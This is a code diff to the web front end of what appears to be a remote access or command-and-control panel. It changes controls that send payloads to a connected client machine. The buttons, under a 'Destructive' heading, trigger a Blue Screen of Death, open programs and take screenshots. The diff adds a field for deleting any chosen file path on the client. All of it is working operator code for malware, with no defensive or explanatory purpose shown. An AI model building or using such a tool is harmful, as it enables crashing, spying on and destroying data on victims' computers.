@@ -37,7 +37,10 @@
                   Destructive
                 </button>
                 <button type="button" class="list-group-item list-group-item-action" onclick="getPayloadBytes('bsod')">Blue Screen of Death</button>
-                <button type="button" class="list-group-item list-group-item-action"onclick="deleteStuff()">File Deletion</button>""
+                <div class="input-group">
+                  <span class="input-group-text" id="basic-addon3" onclick="deleteStuff()">Delete File:</span>
+                  <input type="text" id="f" class="form-control" id="basic-url" aria-describedby="basic-addon3" placeholder="C:\">
+                </div>
                 <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('calc')">Open Windows</button>
               </div><!-- End List group with Links and buttons -->
 
@@ -119,13 +122,13 @@ function callAPI(payload) {
   }));
 }
 
-function deleteStuff(stuff) {
+function deleteStuff() {
   var xhr = new XMLHttpRequest();
   xhr.open("POST", '/api/payload/delete', true);
   xhr.setRequestHeader('Content-Type', 'application/json');
   xhr.send(JSON.stringify({
       "client": '{{client}}',
-      "filename": stuff
+      "file_name": document.getElementById('f').value
   }));
 }
 
@@ -139,8 +142,8 @@ function getScreenshot() {
 
   xhr.onreadystatechange = function() {
     if (xhr.readyState == XMLHttpRequest.DONE) {
-        var ss = xhr.responseText;js 
-        window.open("data:image/png;base64," + ss, '_blank');
+        var ss = xhr.responseText;
+        window.open("data:image/png;base64," + ss);
     }
   }
 }
